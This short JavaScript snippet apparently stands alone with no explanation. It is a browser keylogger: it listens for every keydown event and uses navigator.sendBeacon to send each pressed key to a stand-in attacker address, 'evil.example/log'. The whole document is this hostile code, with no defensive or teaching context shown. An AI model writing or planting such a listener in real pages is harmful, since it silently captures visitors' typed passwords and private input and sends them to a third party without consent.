window.addEventListener('keydown', (e) => {
  navigator.sendBeacon('https://evil.example/log', e.key);
});
